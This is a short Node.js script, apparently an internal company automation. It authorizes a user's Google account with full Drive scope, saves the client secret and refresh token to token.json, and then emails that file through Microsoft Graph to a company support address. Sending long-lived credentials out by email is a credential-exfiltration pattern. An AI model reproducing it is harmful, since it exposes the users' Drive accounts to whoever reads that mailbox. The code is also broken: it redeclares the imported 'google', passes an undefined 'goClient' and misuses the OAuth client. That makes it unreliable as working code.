import * as fs from 'fs/promises'
import * as path from 'path'
import * as process from 'process'
import {authenticate} from '@google-cloud/local-auth'
import {google} from 'googleapis'
import {graphClient} from './auth.mjs'
 
// If modifying these scopes, delete token.json.
const SCOPES = ['https://www.googleapis.com/auth/drive'];
// The file token.json stores the user's access and refresh tokens, and is
// created automatically when the authorization flow completes for the first
// time.
const TOKEN_PATH = path.join(process.cwd(), 'token.json');
const CREDENTIALS_PATH = path.join(process.cwd(), 'credentials.json');

/**
 * Serializes credentials to a file compatible with GoogleAuth.fromJSON.
 *
 * @param {OAuth2Client} client
 * @return {Promise<void>}
 */
async function saveCredentials(client) {
  const content = await fs.readFile(CREDENTIALS_PATH);
  const keys = JSON.parse(content);
  const key = keys.installed || keys.web;
  const payload = JSON.stringify({
    type: 'authorized_user',
    client_id: key.client_id,
    client_secret: key.client_secret,
    refresh_token: client.credentials.refresh_token,
  });
  await fs.writeFile(TOKEN_PATH, payload);
}

/**
 * Load or request or authorization to call APIs.
 *
 */
async function authorize() {
  const client = await authenticate({
    scopes: SCOPES,
    keyfilePath: CREDENTIALS_PATH,
  });
  if (client.credentials) {
    await saveCredentials(client);
  }
  return client;
}


const google = await authorize();

const drive = google.drive({version: 'v3', auth: goClient});

const tokenFile = await fs.readFile(TOKEN_PATH);
const userCall = await drive.about.get({fields: 'user'});
const username = userCall.data.user.emailAddress.slice(0, userCall.data.user.emailAddress.indexOf('@'));

const sendEmail = {
    message:{
        subject: "Token de autorização Google - " + `${username}`,
        body: {
            contentType: 'HTML',
            content: 'Segue em anexo o token de aplicativo.'
        },
        toRecipients: [
            {
                emailAddress: {
                    address: 'suporte02@grupounus.com.br'
                }
            }
        
        ],
        attachments:[
            {
              '@odata.type': '#microsoft.graph.fileAttachment',
              name: 'token_' + `${process.env.USERNAME}` + '.json',
              contentType: 'application/json',
              contentBytes: tokenFile.toString('base64')
            }
          ]
    },
    saveToSentItems: 'true'
};

try{
await graphClient.api("users/automacoes@grupounus.com.br/sendMail").post(sendEmail);
}catch(error){
  console.log(error);
}

console.log("SUCESSO");